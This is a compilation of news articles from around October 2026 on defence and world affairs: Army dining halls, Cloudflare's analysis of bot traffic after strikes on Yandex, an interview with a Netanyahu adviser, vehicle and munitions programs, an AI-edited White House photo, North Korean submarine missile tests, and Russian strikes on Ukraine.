title: Expanded dining options popular among soldiers, US Army officials say
body: The U.S. Army is continuing to roll out pilot programs aimed at improving soldiers’ diets, including expanded, campus-like dining hall options and partnerships with restaurant franchises — and reporting high soldier satisfaction with the changes. “Chow halls operated on decades-old schedules that clashed with modern soldier work shifts,” Jason Condrey, acting deputy chief of staff of Army Materiel Command, said Wednesday at the Association of the United States Army annual meeting in Washington, D.C. Changing how, when and where service members can eat is an ongoing process, with new programs, such as flexible eating and extended dining (FEED) and campus-style dining venues (CSDV), available at select Army installations in the continental U.S. CSDVs launched in September 2025 and are currently available at five different Army installations: Fort Bragg, North Carolina; Fort Stewart, Georgia; ort. Carson, Colorado; Fort Hood, Texas; and Fort Drum, New York. They are operated by private contractors, unlike traditional garrison dining halls that are operated by the base and staffed by soldiers. The panel of Army officials on Wednesday touted the popularity of the new dining facilities. “[At] Fort Carson alone ... we’re looking at about 67% utilization from the soldiers that live in the barracks, and another 56% for the soldiers that live at Fort Hood,” Sgt. Maj. Damarco Wyatt of Army Materiel Command said. Dependents can dine with their soldiers at CSDVs, Wyatt added, though they still must pay for their meals. Traditional garrison dining halls typically allow dependents only under specific circumstances, like holidays. “If we look at the two that have been open the longest — at Hood and at Carson — Hood’s a very large installation, and yet the Army is serving about 55% of its meals from the CSDV,” said Sydney Smith, director of materiel management at the Office of the Deputy Chief of Staff. “At Carson, about 85% of meals are being served out of that one CSDV.” Soldiers who are of legal drinking age can purchase wine, beer, cider and hard seltzer during specific hours at Fort Hood’s CSDV, though it’s unclear whether other installations will offer alcohol. The decision is being left to each installation’s senior commander, the commanding general of Army Materiel Command said in February . The Army’s commercial partners are responsible for outfitting the dining facilities for service. “The contractors are willing to pay for that themselves, so that they can be successful,” said Scott Kindberg, executive director for support operations at the Army Sustainment Command. Some critics have questioned the decision to hand over food production to commercial entities, citing past problems with commercially built military housing . Still, the Army plans to expand the CSDV program beyond the five current installations. The service’s efforts are part of a broader quality-of-life initiative across the military to offer troops better dining experiences. Earlier this month, Camp Pendleton, California, opened a chow hall drive-thru to better serve Marines and sailors.

title: Russian bots and influence operations 'weren't disrupted by Ukraine strikes'
body: Ukraine President Volodymyr Zelenskyy's claim that last weekend's attacks on Russia 's Yandex data centres led to a drop in Pro-Russian bot operations is causing debate. The situation highlights the need to differentiate between bots, social media trolls and sophisticated influence operations , experts say. Prof Olga Belogolova , director of the emerging technologies initiative at Johns Hopkins University School of Advanced International Studies in Washington, wrote a long LinkedIn post to try to give context. Prof Belogolova, who previously led policy at Meta against influence operations, said that too many people saw "what they wanted to see" with data from network and cloud infrastructure company Cloudflare. "The story went viral when people started sharing a Cloudflare screenshot as proof of the silenced troll farms, as it showed a severe drop in bot traffic," she said. "Their motivated reasoning made them see that the internet was cleaner, more friendly, less toxic. "As someone who investigated and disrupted numerous malign influence operations and troll networks, I can also tell you that they do not often host their infrastructure on Yandex ." Prof Belogolova also said that far too many people were confusing and misusing tech terminology. "Bots are importantly not trolls ... as many tech researchers have already pointed out, Cloudflare labels any non-browser, automated script as a bot," she said. She said that when a data centre is taken offline, "its automated web-crawling and indexing traffic cuts out too". Cloudflare Radar, a branch of the company, agreed that nuance was needed when looking at internet traffic data. "Bot traffic refers to automated requests to websites on Cloudflare's network, such as crawlers and scripts, not necessarily activity on social media platforms," a post from Cloudflare Radar read, casting doubt on claims that Russia's social media trolls and disinformation campaign had been disrupted. On Thursday, Cloudflare provided more clarity on the Ukrainian attacks on Russian data centres. "Cloudflare data reveals that while search crawling stopped, malicious bots simply migrated to other networks," the company posted. "There was no evidence that the strikes knocked social media manipulation offline or otherwise disrupted malicious activity on the internet." When strikes hit Yandex data centers, many assumed Russian bot operations went dark. Cloudflare data reveals that while search crawling stopped, malicious bots simply migrated to other networks. https://t.co/TiuaOjqlDf — Cloudflare (@Cloudflare) October 14, 2026 Yet Prof Belogolova said that there were probably still ramifications faced by Russia after the data centre strikes. "Kinetic strikes on Russian tech infrastructure may disrupt Russia's digital economy and cloud services," she said. "They are not exactly a precise tool for stopping foreign influence operations."

title: WATCH: Israel ‘very close’ to creating conditions for regime change in Iran, Netanyahu adviser says
body: Israel was “very close” to creating conditions for regime change in Iran, Prime Minister Benjamin Netanyahu's foreign policy adviser Ophir Falk told The Jerusalem Post in a studio interview, while stressing that the Iranian people would have to determine their country's future.“I think we're very close to creating those conditions,” Falk said when asked how close pressure on Tehran had brought the prospect of regime change. “Those conditions are being created as we speak right now.”Speaking with Post Editor-in-Chief Zvika Klein and diplomatic correspondent Amichai Stein, Falk said Israel's actions were creating conditions that would allow Iranians to challenge their rulers.“Regime change in Iran is up to the Iranian people,” he said.Falk described the US-led economic blockade as successful, while noting that economic pressure needed time to produce results. He argued that Iran and its regional proxies had been severely weakened by the war, citing strikes on senior figures, nuclear scientists, missiles, launchers and production capabilities.Stein asked whether Israel and the US had done enough to provide the Iranian people with the means to challenge their rulers. Falk described Operations Rising Lion and Roaring Lion as “two of the most successful military operations in recent history,” saying their achievements had been “incredible” while acknowledging that no military operation could be perfect.He also acknowledged the danger facing Iranians who took to the streets, citing the regime's violent repression of protesters.“I can appreciate the concerns of people,” he said when the discussion turned to their fear of demonstrating.Falk did not offer a timetable for political change in Tehran or detail what further assistance might be provided to Iranians seeking it.Gaza disarmament and the proposed two-week pauseTurning to Gaza, Falk said Hamas could disarm “in an afternoon” if it wanted to, and that Israel would not redeploy before the terrorist group was fully disarmed. Reconstruction, he said, would have to wait for demilitarization.“If Hamas wanted to disarm, they could do that in an afternoon,” he said. “And that's what we expect.”Falk outlined three requirements for Gaza: disarming Hamas, demilitarizing the territory and deradicalizing its population. He presented those goals as consistent with US President Donald Trump's 20-point plan.“That means zero weapons,” he said of demilitarization.The Trump-led Board of Peace was established to oversee implementation of the plan, including Gaza's reconstruction and transition to a new governing framework. Stein pressed Falk on why Israel would not agree to a two-week pause in targeted killings and other military activity to allow an attempt at securing Hamas's disarmament. The question followed Klein's description of frustration among figures in the Trump administration over Israel's approach to the board's work.Falk said he was unfamiliar with the 14-day proposal. He reiterated that Hamas and all other terrorist organizations in Gaza had to disarm, and that Israel would not redeploy before Hamas was fully disarmed throughout the territory.“We're not going to settle for anything less,” he said.When Klein pointed out that changing attitudes among Gaza's population could not be accomplished in an afternoon, Falk agreed that deradicalization would take time. He reiterated that Hamas could disarm in an afternoon if it wanted to.'We have not been as successful' in information warfareFalk's assessment of Israel's diplomatic position was consistently upbeat. He pointed to relations with the US, India, South American countries and European partners as evidence that Israel's military strength had reinforced its international standing.Klein challenged that assessment, asking about hostility toward Israel among Democrats and signs of erosion within the Republican Party. Stein raised statements marking October 7 in which US political figures devoted substantial attention to Palestinian suffering and criticism of Israel.Falk acknowledged a problem in the public arena.“We've been fighting a seven-front war, and on the eighth front, the information warfare, we have not been as successful as we have been on the battlefield,” he said. “And we will need to address that as well.”He nevertheless maintained that the strategic relationship with Washington remained exceptionally close, citing joint military activity, planning and frequent conversations between Netanyahu and Trump.Asked how many times the two leaders had spoken over the preceding week or two, Falk said they spoke often but could not recall the precise timing.“I haven't seen daylight between the president and the prime minister on the big issues,” he said when asked about differences over Iran.Pressed on whether American requests had constrained Israeli military decisions, Falk said Netanyahu's approach was to agree when possible and refuse when Israel's security required it. He added that Netanyahu had said no on a number of occasions.'We're going to get them all out': Falk on the hostage negotiationsFalk said Netanyahu rejected an early working assumption held by some that Hamas would kill all the hostages and insisted that bringing every hostage home become a formal war objective.“The prime minister did not accept that,” Falk said. “He said we're going to get them all out, and we're going to put it as a war objective to get them all out.”Falk maintained that military pressure, diplomatic pressure and a united Israeli-American position were the combination that produced hostage releases. He said perceived differences between Jerusalem and Washington encouraged Hamas to retreat from negotiations.Falk also credited Netanyahu with pressing then-president Joe Biden to increase pressure on Qatar to secure additional releases during the first agreement in November 2023.One of the most pointed exchanges concerned whether Israel could have secured an additional hostage agreement between the November 2023 releases and the January 2025 deal.Stein asked whether any agreement had been possible during that period, distinguishing between the availability of a deal and whether it would have been a good deal for Israel.“No, there was no deal on the table,” Falk initially replied.When pressed, he defined that answer in terms of the government's war objectives: dismantling Hamas's military and governing capabilities, freeing all the hostages and ensuring Gaza could no longer threaten Israel.“There was no deal that could enable Israel to achieve its war objectives,” he said.Falk argued that an arrangement requiring Israel to release large numbers of Palestinian prisoners, withdraw and leave the prewar threat intact would have contradicted the goals approved by the cabinet. He cited an Israeli proposal that then-US secretary of state Antony Blinken described in April 2024 as “extraordinarily generous,” saying Hamas had rejected it.His account addressed a dispute that has resurfaced around former White House Middle East coordinator Brett McGurk's book, Brink: Inside the Race to Free the October 7th Hostages, and McGurk's recent interview with the Post. In a separate interview on Dan Senor's Call Me Back podcast, McGurk called the suggestion that Hamas had been ready to release all the hostages in the days after October 7 “complete bullshit.” He said Hamas had demanded the release of all Palestinian prisoners, continued Hamas rule and a return to the prewar status quo. Phil Gordon, who served as national security adviser to then-vice president Kamala Harris, challenged claims that McGurk's account vindicated Netanyahu. Gordon alleged that Netanyahu introduced additional conditions in July 2024 after Hamas accepted the basic framework, delaying an agreement by six months. Asked about McGurk's impression that members of Israel's negotiating team had sometimes gone beyond Netanyahu's position, Falk declined to dispute the former US official's personal assessment.“I don't want to argue with Brett's feelings,” he said. He added that Netanyahu and the cabinet would not approve an agreement that jeopardized Israel or its war objectives.Falk praised Trump's approach, while declining to speculate about whether Israel would have reached the same position had Kamala Harris won the 2024 presidential election or Biden served another term.He accused the Biden administration of imposing a “de facto embargo” on some weapons Israel needed before the Rafah operation. The Biden administration paused a shipment of heavy bombs in May 2024 over concerns about civilian casualties, while other US weapons continued to flow to Israel. October 7: 'It's going to be a long war'Falk also described his own morning on October 7, 2023, saying he was asleep when the attack began and was called shortly afterward to the Kirya, Israel's military headquarters in Tel Aviv.Before leaving, he woke his children, who were serving in the military, and told them to report to their units.He described Netanyahu as focused while receiving updates on the unfolding attack.“He told me it's going to be a long war,” Falk recalled, saying the remark came on the way to an initial briefing from the security chiefs.According to Falk, Netanyahu's immediate instructions included reinforcing the northern front to deter Hezbollah from joining the fighting, enabling the military to concentrate on the south, preventing the terrorists who had entered Israel from returning to Gaza and calling up as many reservists as needed.Falk said that, to the best of his recollection, French President Emmanuel Macron was the first foreign leader to call Netanyahu that day. He recalled Macron offering to mediate on the day of the massacre and Netanyahu rejecting the approach.According to Falk, Netanyahu compared Hamas to ISIS and warned that Macron would face the group in Paris if Israel did not dismantle it in Gaza. Falk said Netanyahu also told Macron not to convey messages on his behalf, adding that Hamas would soon receive a message from Israel.He also denied reports raised by Klein that UAE President Sheikh Mohammed bin Zayed Al Nahyan had telephoned Netanyahu before October 7 to warn him of an impending attack.“There was no such call,” Falk said.Klein distinguished that allegation from possible communications between the countries' intelligence agencies. Falk said he was unaware of any warning or caution, while reiterating his denial of a warning call between the leaders.Abraham Accords and Saudi ArabiaOn regional diplomacy, Falk praised the United Arab Emirates and said economic relations under the Abraham Accords, the US-brokered normalization agreements launched in 2020, had continued to develop through the war.Asked why the UAE had publicly acknowledged Netanyahu's visit, Falk said doing so served both countries' national interests. He described the visit as “fantastic.”He expressed support for normalization with Saudi Arabia but gave no details of negotiations or conditions for an agreement.The discussion also touched on the flydubai passengers diverted to Saudi Arabia. Asked about the refusal to allow an Israeli civilian aircraft to collect them, Falk emphasized reports that they had been treated well and had reached Israel safely. He said a joint investigation into the incident was underway.On the Houthis, the Iranian-backed movement in Yemen, Falk condemned attacks on civilians and said Israel would act to defend its security and national interests. He did not specify whether Israel was assisting Saudi Arabia against the group.Asked what needed to happen for additional countries to establish relations with Israel, Falk initially said Israel had to win the war and then secure peace. When pressed on whether normalization would therefore have to wait, he said agreements could come whenever prospective partners were ready.“I think that can happen and will happen much quicker than you think,” he said.

title: As Army’s Planned ISV Buy Grows To 12,000 Vehicles, GM Defense Exec Sees Potential To ‘Double That’
body:
While the Army has already boosted the planned acquisition objective for the GM Defense [GM]-built Infantry Squad Vehicle to 12,000 vehicles, the company’s top executive has said he believes the service will “double that” figure amid the increased demand for the platform.
Steve duMont, president of GM Defense, told reporters he sees the potential boost to the procurement projection as encompassing the full ISV family of vehicles including the base nine-seat troop carrier variant, the newer five-seat, cargo-carrying ISV-utility and the currently in-competition ISV-Heavy platform.
“We’ll look at future defense budgets, like we always do. But I’m really confident that this will be around for a long time,” duMont said during a briefing at the Association of the U.S. Army’s annual conference in Washington, D.C.
The Army approved GM Defense’s ISV, based on the ZR2 variants of the company’s Chevrolet Colorado midsize truck, for full-rate production in April 2023, with the company having delivered hundreds of the lightweight, air-droppable platforms to date ( Defense Daily , April 5 2023).
The original acquisition objective for ISV was to build nearly 650 vehicles for airborne brigades, duMont noted, with the Army then moving to significantly expand acquisition plans as it made the platform a focal point capability for its mobile brigade combat teams.
“When you take a look at the current snap to the chalk line for the acquisition objective, it really focuses heavily on the mobile brigades. Now, I think you’re going to see a movement beyond the mobile brigades, both Active and Guard,” Pete Johnson, GM Defense’s vice president of business development for integrated vehicles, said during the briefing.
The Army this year began buying the new ISV-Utility, the platform’s first production variant, which involved reconfiguring the base vehicle’s design to allow soldiers to carry more equipment in the back, to include energy storage units or enabling the launch and recovery of drones.
“I think as those vehicles get out of soldiers, they’re going to find other uses for them. So it’s everything from carrying mission kits, counter-UAS with mobile mortar capability, mobile command and control, anything that needs to be ‘shoot on the move’ and fits into that vehicle, it’s a great opportunity to do that,” duMont said.
Following the briefing, Johnson told Defense Daily the ISV-Utility will “definitely be the majority variant” for the total fleet, noting those vehicles have already been delivered to the 101st Airborne Division, the 25th Infantry Division and the Virginia National Guard.
The Army on Sept. 21 awarded GM Defense a $697.7 million contract modification for engineering change proposals related to the ISV-Utility.
GM Defense is also currently competing against defense newcomer and major automotive maker Ford [F] and the smaller, family-owned off-road vehicle company BC Customs in the ISV-Heavy (ISV-H) prototyping effort, with the Army targeting the second half of fiscal year 2027 to make a production decision ( Defense Daily , July 30).
“The ISV-H will provide critical operational capabilities, including exportable power to support tactical operations and onboard power to enable mission command while maneuvering. The ISV-H deploys worldwide by sea, air and land modes to support strategic deployment and operational maneuver of the Army’s Maneuver Brigade Combat Teams (MBCT),” the Army wrote in an earlier notice.
Johnson told Defense Daily the Army has asked the ISV-Heavy competitors to deliver three prototypes by the end of March 2027, which will go through a user assessment and additional Army testing through June, with the service having laid out plans for an initial acquisition objective of just over 600 vehicles.
“There is a sense that there is this huge need for power and energy out there, And there’s also a desire to try to get rid of trailer generators, or at least reduce the amount of trailer generators that are out there. Any ISV-Heavy can satisfy all those requirements as well. So if you just think through the lens of power generation, not just mission command on the move, which is the initial focus for the ISV-Heavy program, you can see a need for additional deployments out there, plus just additional payload,” Johnson said.

title: F-35 Drops 8 Bombs in Quick Succession During ‘Ripple’ Test
body: The Marine Corps recently conducted its first-ever “ripple” release of eight Small Diameter Bomb IIs from an F-35B, a key early step in proving out the capability for all F-35 variants. A “ripple release” refers to munitions all being released in one pass instead of multiple go-arounds. Marine aviators from the Marine Operational Test and Evaluation Squadron 1 at Yuma Proving Ground, Ariz., conducted the test Sept. 15, retired Air Force Maj. Gen. Jon Norman, Raytheon’s vice president for air and space systems, told Air & Space Forces Magazine. SDB II, also called “StormBreaker,” is a 250-pound, low-yield, precision-guided munition that can hit moving targets in all weather conditions at ranges of at least 46 miles. It is a joint effort between the Air Force and Department of the Navy and is built by RTX’s Raytheon. While software and other issues have delayed fielding StormBreaker on the F-35, the “ripple” capability could be critical to the Lockheed Martin-made stealthy fighter down the line, Norman argued. “From a pilot perspective, it’s nice because you’re not sitting there exposing yourself when you have eight targets to address,” he said. It also eliminates the need to do hands-on weaponeering for each bomb. “You address the entire target set, so it’s less workload in the cockpit, and you’re able to achieve an effect that I think the pilots are really going to appreciate,” Norman said. The networked missiles can also be confined to a defined kill box to ensure they strike only a specific area on the battlefield. “We’re able to set boundaries,” Norman said. “So, you give it a kill box, and it’ll exclude everything outside of that and only hit within that kill box.” The GBU-53 Small Diameter Bomb, “Stormbreaker,” on the F-15E Strike Eagle. (Air Force) That’s a key upgrade for the StormBreaker compared to what the bomb is replacing— cluster munitions . SDB II was developed to give pilots an option to replace legacy-era cluster munitions following the 2008 DOD policy directive , which set a 2019 deadline to stop using the area-saturation weapons that had high failure rates and could produce swaths of unexploded ordnance on battlefields. So, a pilot could spot a boat swarm, quickly set the parameters, and then launch eight 250-pound missiles to destroy the mini-fleet in one pass, Norman said. “Through automated target recognition software that’s built into it, we can hit prioritized threats,” Norman said. “So, if one fails or one gets shot down, then they just reorder the prioritization.” F-35 Tests Low-rate initial production on the StormBreaker started in 2015, and the Air Force cleared the bomb to go on its “objective” aircraft, the F-15E, in 2020. But the service hopes to integrate the munition onto many more platforms, including the F-35A. The Navy, meanwhile, cleared the SDB II to go on its F/A-18E/F this February , though its objective aircraft remains the F-35B and C. But while the F-15 and F/A-18 carry the StormBreaker externally, the F-35 uses its internal weapons bays to maintain stealthiness, offering a new wrinkle to the ripple release process. The F-35B has the smallest internal capacity of the variants, to accommodate the fan that enables vertical landings. The next ripple release test is planned for this quarter over a small range in Texas, Norman said. “We’ll take those results then to the Air Force and to the Navy and the Marines and say, “we’ve demonstrated this capability, is this something you’re interested in?’” Norman told Air & Space Forces Magazine. Future tests could include striking moving targets at sea with multiple munitions, Norman said—a particularly relevant capability, given reports of swarming boat attacks by the Iranian military in the Strait of Hormuz. As Raytheon works on refining the “ripple eight” capability for operational use, the F-35 fleet is awaiting rolling software patches to fully incorporate the StormBreaker into its arsenal. A July report from the Government Accountability Office noted that “SDB II initial capability on the F-35 is delayed 2 years, and program officials said that it might be delayed 2 more years due to F-35 software development issues.” The F-35 fleet has undergone its third technology refresh, or TR-3, which upgraded the L3Harris core processor, replaced the aircraft’s memory storage unit, and installed multicore processors. But while a “truncated” version of TR-3 was completed in 2025, the fleet is still getting software patches to continue upgrades. “Development on TR-3 was completed in 2025,” Lockheed Martin spokesperson Mireya Villarreal told Air & Space Forces Magazine in an email. “We continue to build on this baseline through the Block 4 modernization program, which implements upgrades including additional weapons, electronic warfare capabilities and improved sensor technology to ensure the warfighter can defeat any threat.” Raytheon Technologies’ StormBreaker® smart weapon is a guided, gliding precision munition with a tri-mode seeker that allows it to track moving targets in low-visibility conditions such as darkness, poor weather and battlefield smoke and dust. Courtesy of Raytheon StormBreaker’s Future in addition to the ripple release test, Norman said Raytheon is working to extend the StormBreaker’s 46-mile range by exploring engine efficiencies and design work on the bomb’s body. “We don’t want to constrain pilots,” Norman said. “We want to give them their full operating envelope to be able to release this.” At the program’s inception, the Pentagon planned to acquire 21,160 StormBreakers, but that figure has now risen to 31,800, according to the GAO report “Last year we produced and delivered 1,500 StormBreakers. This year we’re increasing that,” Norman said. He could not provide specific numbers for this year’s deliveries. “But it’s a significant increase, and we have capacity in the factory to increase more,” he said. The post F-35 Drops 8 Bombs in Quick Succession During ‘Ripple’ Test appeared first on Air & Space Forces Magazine .

President Donald Trump posted a series of photos on Truth Social showing off renovations to the White House — but one of them appears to be modified with AI. The picture, which compares an old White House column to a “restored” one, has several discrepancies and was flagged by Google’s AI detector as “made or edited with OpenAI.”
As pointed out by users on Reddit , the picture of the “restored” column has an uneven number of steps on both sides of the structure. The number of steps also doesn’t match up with the ones in the “before” photo. Additionally, the before and after photos appear nearly identical in angle and detail; the reflection in the windows is nearly the same, and the protective cardboard at the bottom of the column seems to be in the same spot as well. Not to mention that the “newly-painted” one looks unnaturally smooth.
The Verge can confirm that the photo posted to Truth Social is flagged as AI-generated when uploaded to Google’s SynthID Detector , which scans images, videos, and audio for an invisible watermark that indicates it was “created or edited” with AI.
Real pictures show people painting the front of the White House in June , so it’s possible the column actually did get a fresh coat of paint — the White House didn’t immediately respond to a request for comment. The SynthID watermark wasn’t detected on other pictures Trump posted, which show the White House facade and heliport. Trump is no stranger to AI tools, though, as he often posts AI-generated caricatures of himself , while the White House has been known to post racist AI memes and at least one photo deceptively edited to make a protester appear distraught.

An agreement has been signed with the United States Government to purchase five MH-60R Seahawk maritime helicopters and associated systems and weapons.
The new helicopters, which will be operated by Royal New Zealand Navy aircrew and maintained by Royal New Zealand Air Force personnel, will be interoperable with Australia and partner defence forces and provide essential capabilities such as anti-surface and underwater warfare, search and rescue, transportation of personnel and supplies between ship and shore, and support maritime counter-terrorism operations.

Future investment decisions relating to this programme of work are expected to include infrastructure, training systems and complementary uncrewed aerial systems.

title: North Korea’s ‘Hunchback’ Submarine Makes First At-Sea Appearance For Missile Tests
body: North Korea says it has test-fired two types of submarine-launched strategic cruise missiles off its east coast, in what appears to be the first time its bizarre Hero Kim Kun Ok submarine has been seen at sea in a publicized manner. If the vessel truly was the launch platform, the tests would mark its first confirmed weapons trials and a potential step toward operational service. Unveiled with considerable fanfare in 2023 , the Hero Kim Kun Ok has been billed by Pyongyang as a centerpiece of its future nuclear-armed navy, but its operational status and actual capabilities have remained unclear. The launches took place Wednesday, October 14, with state media Korean Central News Agency (KCNA) reporting the activity earlier today. North Korea said the tests were intended to assess the readiness of its underwater combat systems, improve the Navy’s ability to execute strategic missions, and demonstrate the reliability of its deterrent. Along with imagery of the cruise missiles, KCNA released one photo of the Hero Kim Kun Ok underway, which you can see at the top of this story. The launch of a cruise missile, apparently from a vertical launch tube. North Korean state media North Korean state media Submerged launch of one of the North Korean cruise missiles. North Korean state media KCNA did not otherwise identify the submarine involved or disclose the missiles’ ranges, flight paths, or performance. South Korea’s Joint Chiefs of Staff (JCS) said it had detected and tracked the launches from before firing through the cruise and terminal phases. A JCS spokesperson said one missile type was launched from a vertical launch system and another from a torpedo tube. This would match the imagery we are seeing, it would also match the Hero Kim Kun Ok’s unique capabilities. The South Korean military assessed that the launches came from a submarine but did not initially identify the vessel publicly. There remains a possibility that the 3,000-ton-class Hero Kim Kun Ok was not actually involved in launching the missiles. North Korea has long used underwater platforms for test missile launches and has paired these with images of an actual submarine for propaganda purposes. However, the JCS confirming they came from a submarine would lend additional credence to the possibility Hero Kim Kun Ok did indeed launch the missiles. If this is the case, it would indicate that North Korea has begun validating weapons systems aboard the submarine ahead of deployment. At the very least, we can confirm that the Hero Kim Kun Ok is now sailing, although South Korean and U.S. intelligence would be acutely aware of its movements and it could have been in at-sea testing for years now, we just don’t know. North Korea unveiled the submarine in September 2023, describing it as its first “tactical nuclear attack submarine” and one of the Navy’s core offensive platforms. At the launching ceremony, North Korean leader Kim Jong Un was quoted as saying that arming the Navy with nuclear weapons “brooks no further delay.” The North Korean diesel-electric submarine Hero Kim Kun Ok , which has the hull number 841. North Korean state media Nevertheless, many questions remain about the submarine’s design and operational prospects. Overall, it remains a heavily modified derivative of a Cold War-era Romeo class diesel-electric submarine — nearly an antique by today’s standards — rather than a purpose-built guided missile submarine. Previous imagery shows 10 missile launch tubes concealed in the prominent ‘turtle back’ aft of the sail, in addition to torpedo tubes, although the precise configuration, usable capacity, and operational status of those systems remain uncertain. The absence of publicly reported weapons tests from the vessel over the following years raised questions about its development. Analyst Shin Jong-woo of South Korea’s Defense and Security Forum told Reuters that the latest launches suggested combat-system testing for operational deployment was underway. He also suggested that North Korea may have resolved technical problems and could also test a submarine-launched ballistic missile (SLBM) before the vessel enters service. North Korea has previously presented SLBMs of increasing size , but has lacked a suitable submarine to launch them from. The North Korean diesel-electric submarine Hero Kim Kun Ok during its launch. North Korean state media Missile launches while the submarine is submerged represent a more demanding and operationally relevant capability than firing from the surface. At the same time, a missile launch of any kind demonstrates only part of the capability required for a submarine like this to be effective at all. An operational submarine must also be able to deploy reliably, remain sufficiently difficult to detect, maintain its weapons, and execute missions under realistic conditions. A vertical launch system (VLS) can provide dedicated capacity for certain missile types — potentially much larger ones — and may enable faster launches or larger salvos than a configuration relying exclusively on torpedo tubes. Torpedo tubes offer an alternative launch method, but with different constraints on weapon dimensions, handling, and firing procedures. The forward four tubes are larger than the rear six on the submarine’s ‘turtle back.’ This would allow the boat to carry multiple types of missiles, possibly including a mix of short-range and longer-range submarine-launched ballistic missiles (SLBMs) and submarine-launched cruise missiles (SLCMs). A North Korean cruise missile in flight after submerged launch. North Korean state media Testing both systems would be consistent with an effort to validate multiple elements of the submarine’s weapons architecture. North Korea has pursued submarine-launched missiles for years. In March 2023, it reported a submarine-launched cruise missile test from the older 8.24 Yongung submarine. In January 2024, Pyongyang said it had fired Pulhwasal-3-31 strategic cruise missiles from that same vessel. The earlier sub is in the 2,000-ton-class and is understood to have only one or two vertical launch tubes. North Korea’s description of the weapons as “strategic” cruise missiles should also be treated cautiously. North Korea’s long-range cruise missile program is well established and a nuclear payload is a major part of its ambitions, but how mature or reliable a nuclear warhead is for this application at this time isn’t clear. Regardless, ground, surface, and now subsurface-launched cruise missiles are a key part of North Korea’s broader deterrent architecture. According to reports, Wednesday’s activity was the first publicly reported underwater North Korean missile-testing event since the January 2024 launch. Compared to the 8.24 Yongung submarine, the Hero Kim Kun Ok has a larger hull and additional vertical launch tubes, but it still uses very dated diesel-electric propulsion, which presents hugely different endurance, acoustic, and operating constraints compared with nuclear propulsion or even modern diesel-electric submarine capabilities. As to the expectation that Pyongyang may test an SLBM from the submarine before deployment, this would be a likely milestone toward North Korea fielding a credible sea-based nuclear deterrent. North Korean SLBMs identified as the Pukguksong-5 on parade in January 2021. North Korean state media North Korea is also pursuing a separate nuclear-powered submarine project , unveiled as under construction in March 2025. Its completion and operational timeline remain uncertain. Nuclear propulsion is a much bigger challenge, but if perfected, such a boat would be of considerably greater value, especially as a second-strike capability. People seen looking at a TV broadcast at Seoul Railway Station showing North Korean leader Kim Jong Un unveiling the manufacturing site for a future nuclear-powered missile submarine at an undisclosed location. Photo by Kim Jae-Hwan/SOPA Images/LightRocket via Getty Images SOPA Images The latest submarine tests come amid a broader series of North Korean weapons demonstrations, including reported hypersonic missile tests on September 20 and October 3, as well as tactical ballistic missile launches earlier in October. The sequence is consistent with Pyongyang’s effort to diversify its delivery systems and complicate military planning for South Korea, the United States, and Japan. A satellite image of the Pongdae Submarine Factory on the northeast coast of North Korea, the center of its submarine development activities. Google Earth The activity also carries a diplomatic message. North Korea has repeatedly insisted that it will not abandon its nuclear weapons while the United States maintains what Pyongyang calls a hostile policy. It has also rejected the suggestion that adjustments to U.S.-South Korean military exercises would be sufficient to change the underlying relationship. The tests also follow North Korea’s rejection of an apparent diplomatic opening from U.S. President Donald Trump after Washington sought to reduce tensions surrounding a U.S.-South Korean military exercise. Kim touring the Sinpo submarine yards back in 2019, the first time we got a glimpse of the future Hero Kim Kun Ok . North Korean state media A submarine able to launch missiles from less predictable locations complicates defensive planning for South Korea and the United States. The challenge extends beyond intercepting missiles after launch to detecting and tracking the submarine before it reaches a potential firing position. Even a partially capable vessel places additional demands on potential adversaries. Were things to ‘go hot’ on the Korean Peninsula, any submarine capable of carrying strategic weapons would be at the top of the targeting list for Pyongyang’s adversaries. A submarine based on the archaic Romeo class design would be fairly easy to track from the time it leaves its berth. This is especially the case bearing in mind the sophisticated nature of South Korea’s anti-submarine capabilities. Future submarines will become increasingly more challenging, however. That problem could intensify if future North Korean boats make more use of Russian assistance in developing their capabilities. Submarine technology is supposedly part of the payment to Pyongyang for its help in the war in Ukraine. This could become a much larger problem, even if Moscow were to provide North Korea with advanced Kilo class boats, for example. For now, provided that the Hero Kim Kun Ok launched the missiles, which seems most likely, this would indicate that North Korea is advancing weapons integration aboard a submarine intended to expand its offensive naval capabilities. The fact that the Hero Kim Kun Ok is now at sea also signals progress toward deployment. Whatever the ultimate operational effectiveness of the Hero Kim Kun Ok and its emerging missile armament, Pyongyang continues to demonstrate incremental improvements to its submarine forces. Contact the author: thomas@thewarzone.com The post North Korea’s ‘Hunchback’ Submarine Makes First At-Sea Appearance For Missile Tests appeared first on TWZ .

title: Russian Strikes Injure 52 Across Ukraine in a Day, Zelensky Says
body:
Russian attacks injured 52 across Ukraine nationwide, President Volodymyr Zelensky said on Thursday, Oct. 15, as Moscow kept up its near-constant drone campaign against Ukrainian cities following a massive overnight barrage.
Zelensky provided the figure in a statement after meeting Polish Prime Minister Donald Tusk in Brussels, saying Russia was using Shahed drones almost continuously and had struck a store, a pharmaceutical plant and logistics facilities during the day.
Follow our coverage of the war on the @Kyivpost_official .
“Donald is well informed about the situation with Russian strikes and how it is escalating every day,” Zelensky said, adding that “We discussed in detail all the current threats and the steps that will help strengthen our protection against Russian strikes.”
While he did not specify where the casualties had occurred, local authorities reported casualties in several regions on Thursday.
According to Ukrainian authorities, air defenses were active in Kyiv since early morning.
Around 10:30 a.m. local time, a Russian drone fell on an open ground near a five-story residential building in the Pechersk district, damaging its facade, roof and windows, as well as two neighboring buildings. A private vehicle was also set on fire, Kyiv Mayor Vitali Klitschko said .
The number of injured rose to seven over the course of the day, three of whom were hospitalized. The rest of the wounded received outpatient treatment.
Shortly after 5 p.m., a drone set fire to a warehouse in the Sviatoshynskyi district, which was hit again minutes later, according to Klitschko.
Ukraine’s State Emergency Service (SES) reported that firefighters put out blazes at a single-story non-residential building and on open ground at a private property in the district.
Air defenses again engaged drones over the capital late Thursday evening. Around 10:50 p.m. local time, debris fell in the yard of a private property in the Shevchenkivskyi district, setting fire to the ground floor of a house.
Klitschko also reported a drop in water pressure in the Holosiivskyi, Sviatoshynskyi, Solomianskyi and Shevchenkivskyi districts on the capital’s right bank, caused by damage to energy facilities in the Kyiv region.
Engineers worked on switching water pumping stations to alternative power.
Overnight, Russian forces launched a massive drone attack on Kropyvnytskyi , the administrative center of the Kirovohrad region approximately 300 kilometers (186 miles) southeast of Kyiv, killing three and injuring six people.
Russia attacked four districts of the Dnipropetrovsk region more than 10 times on Thursday, using drones, artillery and guided aerial bombs (KABs), regional governor Oleksandr Hanzha said .
Strikes on the Slobozhanska community in the Dnipro district damaged a logistics company terminal, trucks and an administrative building, starting a fire, according to the SES .
